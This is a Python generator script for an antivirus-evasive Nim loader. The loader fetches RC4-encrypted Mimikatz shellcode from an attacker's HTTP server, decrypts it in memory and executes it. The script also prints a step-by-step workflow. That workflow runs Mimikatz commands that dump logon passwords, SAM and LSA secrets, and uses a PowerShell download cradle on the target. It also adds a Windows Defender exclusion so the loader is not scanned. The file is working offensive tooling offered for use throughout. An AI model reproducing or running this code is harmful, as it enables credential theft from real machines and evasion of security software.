#!/usr/bin/env -S uv run --script
import argparse
import subprocess
import shutil
import sys
import os

# ============================================================
# NIM LOADER TEMPLATE — AV-Evasive Mimikatz Loader
#   - Downloads update.bin
#   - RC4-decrypts in memory
#   - RW -> RX transition (no RWX flag)
#   - Clean imports, small binary
# ============================================================
NIM_LOADER_TEMPLATE = r"""
import winim/lean
import winim/inc/[wininet]
import std/[strutils]

# ---- CONFIG (injected at generation time) ----
const
  RC4_KEY      = "$rc4_key"
  PAYLOAD_URL  = "http://$ip:$port/$payload_name"
# ----------------------------------------------

proc rc4Decrypt(data: var seq[byte], key: string) =
  var S: array[256, byte]
  for i in 0..255: S[i] = byte(i)

  var j = 0
  for i in 0..255:
    j = (j + int(S[i]) + int(key[i mod key.len])) mod 256
    swap S[i], S[j]

  var i = 0
  j = 0
  for n in 0..<data.len:
    i = (i + 1) mod 256
    j = (j + int(S[i])) mod 256
    swap S[i], S[j]
    data[n] = data[n] xor S[(int(S[i]) + int(S[j])) mod 256]

proc httpGet(url: string): seq[byte] =
  ## Download URL -> bytes via WinINet
  var hNet: HINTERNET = InternetOpenA("Mozilla/5.0".cstring,
        INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
  if cast[uint](hNet) == 0: return @[]

  var hUrl: HINTERNET = InternetOpenUrlA(hNet, url.cstring, nil, 0,
        INTERNET_FLAG_RELOAD or INTERNET_FLAG_NO_CACHE_WRITE, 0)
  if cast[uint](hUrl) == 0:
    InternetCloseHandle(hNet)
    return @[]

  var buf = newSeq[byte](1 shl 20)   # 1 MB
  var total = 0
  var read: DWORD = 0

  while InternetReadFile(hUrl, addr buf[total], DWORD(buf.len - total), addr read) != 0 and read > 0:
    total += int(read)
    if total >= buf.len:
      buf.setLen(buf.len * 2)

  InternetCloseHandle(hUrl)
  InternetCloseHandle(hNet)
  buf.setLen(total)
  return buf

proc executeShellcode(sc: seq[byte]) =
  ## Allocate RW, copy, flip to RX, execute (avoids RWX signature)
  let size = sc.len
  if size == 0: return

  # 1. Allocate RW (not RWX)
  let mem = VirtualAlloc(nil, cast[SIZE_T](size),
                         MEM_COMMIT or MEM_RESERVE,
                         PAGE_READWRITE)
  if mem == nil: return

  # 2. Copy shellcode
  copyMem(mem, unsafeAddr sc[0], size)

  # 3. Flip to RX
  var oldProt: DWORD
  discard VirtualProtect(mem, cast[SIZE_T](size),
                         PAGE_EXECUTE_READ, addr oldProt)

  # 4. Execute via thread
  let hThread = CreateThread(nil, 0,
                             cast[LPTHREAD_START_ROUTINE](mem),
                             nil, 0, nil)
  if cast[uint](hThread) != 0:
    WaitForSingleObject(hThread, INFINITE)

when isMainModule:
  var payload = httpGet(PAYLOAD_URL)
  if payload.len > 0:
    rc4Decrypt(payload, RC4_KEY)
    executeShellcode(payload)
"""

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def run_cmd(cmd, description):
    print(f"[*] {description}...")
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Error during: {description}")
        sys.exit(1)

def check_dependencies():
    deps = {
        "nim":                    "sudo apt update && sudo apt install -y nim",
        "x86_64-w64-mingw32-gcc": "sudo apt update && sudo apt install -y mingw-w64",
    }
    for bin_name, install_cmd in deps.items():
        if shutil.which(bin_name):
            print(f"[+] {bin_name} is already installed.")
        else:
            print(f"[!] {bin_name} not found.")
            run_cmd(install_cmd, f"Installing {bin_name}")

# ============================================================
# GENERATION FUNCTIONS
# ============================================================
def generate_loader(ip, port, rc4_key, payload_name):
    """Generate AV-evasive Nim loader.exe."""
    print(f"[*] Formatting loader.nim for {ip}:{port} (key: {rc4_key})...")

    src = (NIM_LOADER_TEMPLATE
           .replace("$ip", ip)
           .replace("$port", port)
           .replace("$rc4_key", rc4_key)
           .replace("$payload_name", payload_name))

    with open("loader.nim", "w") as f:
        f.write(src)

    check_dependencies()
    run_cmd("nimble install -y winim", "Installing winim library")

    compile_cmd = (
        "nim c -d:mingw -d:release "
        "--os:windows "
        "--cpu:amd64 "
        "--cc:gcc "
        "--gcc.exe:x86_64-w64-mingw32-gcc "
        "--gcc.linkerexe:x86_64-w64-mingw32-gcc "
        "--passL:-lwininet "
        "--opt:size "
        "--app:gui "
        "loader.nim"
    )
    run_cmd(compile_cmd, "Compiling loader.nim to Windows EXE")

    if os.path.exists("loader.exe"):
        print("[+] loader.exe generated successfully!")
        return True
    return False

def generate_encrypted_payload(rc4_key, shellcode_file, out_name):
    """Encrypt mimikatz.bin with RC4 -> update.bin"""
    print(f"[*] Encrypting {shellcode_file} with RC4...")

    def rc4(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        out = bytearray()
        for b in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(b ^ S[(S[i] + S[j]) % 256])
        return bytes(out)

    with open(shellcode_file, "rb") as f:
        data = f.read()

    enc = rc4(data, rc4_key.encode())

    with open(out_name, "wb") as f:
        f.write(enc)

    print(f"[+] {out_name} written ({len(enc)} bytes)")
    return True

def print_workflow(ip, port, rc4_key, payload_name):
    print("\n" + "="*60)
    print("📋 WORKFLOW")
    print("="*60)
    print(f"\n1. Generate shellcode (Donut):")
    print(f"   donut -i mimikatz.exe -a 2 -b 2 \\")
    print(f"     -p '\"log log.out\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"lsadump::secrets\" \"exit\"' \\")
    print(f"     -o mimikatz.bin")
    print(f"\n2. Encrypt + build loader:")
    print(f"   python3 loader.py -l {ip} -p {port} --all")
    print(f"\n3. Serve:")
    print(f"   python3 -m http.server {port}")
    print(f"   # Must have loader.exe + {payload_name} in cwd")
    print(f"\n4. On target:")
    print(f"   powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{ip}:{port}/loader.exe','C:\\Windows\\tasks\\loader.exe')\"")
    print(f"   Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks'")
    print(f"   cd C:\\Windows\\Tasks && .\\loader.exe")
    print(f"\n5. Read output:")
    print(f"   type C:\\Windows\\Tasks\\log.out")
    print("="*60 + "\n")

# ============================================================
# MAIN
# ============================================================
def main():
    help_text = (
        "AV-Evasive Mimikatz Loader Generator (Nim)\n"
        "Generates:\n"
        "  - loader.nim  (Nim source)\n"
        "  - loader.exe  (compiled Windows x64 loader)\n"
        "  - update.bin  (RC4-encrypted Donut shellcode)"
    )

    parser = argparse.ArgumentParser(
        description=help_text,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-l", "--ip", required=True, help="Listener IP")
    parser.add_argument("-p", "--port", required=True, help="Listener port")
    parser.add_argument("-k", "--key", default="%m%3E%X%L%CbIg6g5h6vG7sQrC1S2GxN",
                        help="RC4 key (must match rc4.py)")
    parser.add_argument("--payload-name", default="update.bin",
                        help="Remote payload filename (default: update.bin)")
    parser.add_argument("--loader", action="store_true",
                        help="Generate loader.exe")
    parser.add_argument("--encrypt", metavar="SHELLCODE",
                        help="Encrypt a shellcode file (e.g. mimikatz.bin)")
    parser.add_argument("--all", action="store_true",
                        help="Generate loader.exe + encrypt if mimikatz.bin exists")

    args = parser.parse_args()

    print("\n" + "="*60)
    print("🚀 AV-EVASIVE MIMIKATZ LOADER GENERATOR")
    print("="*60 + "\n")

    if not any([args.loader, args.encrypt, args.all]):
        parser.print_help()
        return

    generated = False

    if args.all or args.loader:
        if generate_loader(args.ip, args.port, args.key, args.payload_name):
            generated = True

    if args.encrypt:
        generate_encrypted_payload(args.key, args.encrypt, args.payload_name)
        generated = True

    if args.all and os.path.exists("mimikatz.bin"):
        generate_encrypted_payload(args.key, "mimikatz.bin", args.payload_name)

    if generated:
        print_workflow(args.ip, args.port, args.key, args.payload_name)

        print("\n" + "="*60)
        print("✅ GENERATION COMPLETE!")
        print("="*60)
        print("\n📁 Files created:")
        if os.path.exists("loader.nim"): print("  ✅ loader.nim  — Nim loader source")
        if os.path.exists("loader.exe"): print("  ✅ loader.exe  — compiled Windows x64 loader")
        if os.path.exists(args.payload_name):
            print(f"  ✅ {args.payload_name}  — RC4-encrypted shellcode")
        print("="*60 + "\n")

if __name__ == "__main__":
    main()